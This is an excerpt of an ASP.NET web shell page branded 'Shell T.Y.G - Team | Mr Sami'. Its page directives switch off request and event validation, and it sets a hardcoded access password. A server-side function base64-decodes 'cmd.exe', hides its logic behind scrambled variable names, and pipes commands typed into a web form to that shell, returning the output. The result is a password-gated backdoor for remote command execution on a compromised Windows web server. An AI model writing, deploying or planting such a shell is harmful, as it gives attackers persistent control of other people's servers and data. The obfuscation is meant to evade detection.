<%@ Page Language="C#"   trace="false" EnableViewStateMac="false" enableEventValidation="false" validateRequest="false"%>
...
<!DOCTYPE html>
<title> Shell T.Y.G - Team | Mr Sami</title>
<style type="text/css">
...
.tab_content h2 {
    font-weight: normal;
    padding-bottom: 10px;
    border-bottom: 1px dashed rgb(0, 238, 255);
    font-size: 1.8em;
    font-family: 'El Messiri', sans-serif;
}
.tab_content h3 a{
...
.tab_content img {
    ...
    border: 1px solid rgb(165, 201, 200);
    padding: 5px;
    font-family: 'El Messiri', sans-serif;
}
</style>
...
display:none
        ...
        td
        {
            padding: 2px;
            background: #a1bb9a;
            border-top: 1px solid rgb(9, 237, 253);
            color: rgb(21, 255, 0);
            font-family: 'El Messiri', sans-serif;
...
<script runat="server">
    private void _WebController()
     { 
         string _LoginProtect = ProtectPageController();
         Response.Write(_Service(_LoginProtect));
     }
     public static string curr = "xxx";
     string connstr;
     string password="1915team";
     public class data
     {
    ...
    private string _Service(string encoded)
    {
    ...
    {
        Response.Write("<!DOCTYPE html><!--Login Control-->");
        _WebController();
        Page.Title = " ";
    ...
    protected void CmdSubmit_Click(object sender, EventArgs e)
    {
        ...
        CmdResult.Text = X9Y8Z7(Command.Text);
    }
   
      public static string X9Y8Z7(string W0X1Y2)
    {
        string encodedCmd = "Y21kLmV4ZQ==";
        string decodedCmd = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(encodedCmd));
        string L3M4N5 = string.Format(@" -S {0} ", "LOSMAN-PC");
        ProcessStartInfo O6P7Q8 = new ProcessStartInfo(decodedCmd);
        O6P7Q8.CreateNoWindow = true;
        O6P7Q8.UseShellExecute = false;
        O6P7Q8.RedirectStandardOutput = true;
        O6P7Q8.RedirectStandardInput = true;
        O6P7Q8.RedirectStandardError = true;
        O6P7Q8.WorkingDirectory = HttpContext.Current.Server.MapPath(".");
        Process R9S0T1 = Process.Start(O6P7Q8);
        StreamReader U2V3W4 = R9S0T1.StandardOutput;
        StreamReader X5Y6Z7 = R9S0T1.StandardError;
        StreamWriter A8B9C0 = R9S0T1.StandardInput;
        string D1E2F3 = W0X1Y2;
        string[] G4H5I6 = { Environment.NewLine };
        string[] J7K8L9 = D1E2F3.Split(G4H5I6, StringSplitOptions.None);

        foreach (string M0N1O2 in J7K8L9)
        {
            A8B9C0.WriteLine(M0N1O2);
        }
        A8B9C0.WriteLine("Exit");
        R9S0T1.Close();
        string P3Q4R5 = U2V3W4.ReadToEnd().Trim();
        string S6T7U8 = X5Y6Z7.ReadToEnd().Trim();
        A8B9C0.Close();
        U2V3W4.Close();
        return P3Q4R5 + S6T7U8;
    }
...
<body>
    <center>
    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4mZcicPsCBtVgswluIBIIwL6P9g2WhLoDQZy0W5bdOuK_WmYXoxCj9I8G6kh0ZUPV09HfZFAWxP66Cqoqeia5or643j2_QfU-3-n2EyKbrVqTmG9wMT6r9dg3qN3FxCl4jzOWfraEXw809dqypBk_PeODSQyniFFgttcXFFlyjJZcN926ZvaykjZtqA/s1024/PicsArt_08-26-06.28.14.png" width="400" height="150" >
    </center>
           ...
           <h3 >Password  <asp:TextBox ID="Login_TextBox"  runat="server"></asp:TextBox> 
            <asp:Button ID="Login_Button" runat="server" Text="LogIn" OnClick="Login_Button_Click" />              
              ...
              <asp:LinkButton ID="Logout" Visible="false"   style=" float :right;" runat="server" OnClick="Logout_Click">
                LOGOUT Code By Sami .. </asp:LinkButton>
              <h3 >  </h3> 
